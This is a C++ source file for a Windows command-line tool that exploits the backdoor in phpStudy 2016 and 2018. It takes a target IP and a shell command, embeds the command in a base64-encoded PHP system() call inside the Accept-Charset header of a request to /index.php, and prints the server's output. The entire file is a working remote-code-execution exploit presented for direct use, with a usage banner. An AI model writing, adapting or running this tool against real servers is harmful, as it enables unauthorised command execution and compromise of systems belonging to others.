#include <iostream>
#include <Windows.h>
#include <winhttp.h>
#include "base64/base64.h"
#include <regex>
#pragma comment(lib, "winhttp")
using namespace std;

wchar_t* chartowchar(const char* commend) {
    size_t newsize = strlen(commend) + 1;
    wchar_t* wcstring = new wchar_t[newsize];
    size_t convertedChars = 0;
    mbstowcs_s(&convertedChars, wcstring, newsize, commend, _TRUNCATE);
    return wcstring;
}


void PHPSTUDYBACKDOOR(const wchar_t * IP, string commend) {
    HINTERNET hSession, hConnect, hRequest;
    BOOL bResults = FALSE;
    hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0", WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    hConnect = WinHttpConnect(hSession, IP, 80, 0);
    hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/index.php", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    WinHttpAddRequestHeaders(hRequest, L"accept-Encoding:gzip,deflate", (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD);
    WinHttpAddRequestHeaders(hRequest, L"Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", (ULONG)-1l, WINHTTP_ADDREQ_FLAG_ADD);
    WinHttpAddRequestHeaders(hRequest, L"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD);

    string commend_head = "system('echo ---- &" + commend;
    string commend_tail = " & echo ----');";

    string commend_system = commend_head + commend_tail;

    string COMMEND_PADYLOAD = base64_encode(reinterpret_cast<const unsigned char*>(commend_system.c_str()), commend_system.length());
    string commend_cmd = "Accept-Charset:" + COMMEND_PADYLOAD;
    

    //WinHttpAddRequestHeaders(hRequest, L"Accept-Charset: ", (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD);
    WinHttpAddRequestHeaders(hRequest, chartowchar(commend_cmd.c_str()), (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD);
    bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    bResults = WinHttpReceiveResponse(hRequest, NULL);
    
    LPSTR pszOutBuffer = NULL;
    DWORD dwDownloaded = 0;
    DWORD dwSize = 0;
    wchar_t* pwText = NULL;
    if (bResults)
    {
        do
        {
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
                printf("%s", "Error：WinHttpQueryDataAvailable failed：" + GetLastError());
                break;
            }
            if (!dwSize) {
                break;
            }
            pszOutBuffer = new char[dwSize];
            if (!pszOutBuffer) {
                printf("%s", "Out of memory.");
                break;
            }
            ZeroMemory(pszOutBuffer, dwSize);
            if (!WinHttpReadData(hRequest, pszOutBuffer, dwSize, &dwDownloaded)) {
                printf("%s", "Error：WinHttpQueryDataAvailable failed：" + GetLastError());
            }
            if (!dwDownloaded) {
                break;
            }
        } while (dwSize > 0);


        std::regex ip_reg("(.*)\.123\.456");
        std::smatch matchResult;

        cout << pszOutBuffer;
        //DWORD dwNum = MultiByteToWideChar(CP_ACP, 0, pszOutBuffer, -1, NULL, 0);
        //pwText = new wchar_t[dwNum];
        //MultiByteToWideChar(CP_UTF8, 0, pszOutBuffer, -1, pwText, dwNum);
        //printf("Received contents: \n%S", pwText);
    }
    return;
}

void PHPSTUDYBACKDOOR_HELP() {
    cout << "----------------------------------------" << endl;
    cout << "PHPstudy backdoor RCE " << endl;
    cout << "Affect Version:" << endl;
    cout << "          phpStudy2016 and phpStudy2018 " << endl;
    cout << "Usage: phpstudybackdoor.exe IP COMMEND" << endl;
    cout << "----------------------------------------" << endl;
}

int main(int argc, const char * argv[])
{
    if (argc != 3)
    {
        PHPSTUDYBACKDOOR_HELP();
        exit(0);
    }
    string commend = argv[2];
    PHPSTUDYBACKDOOR(chartowchar(argv[1]), commend);
}

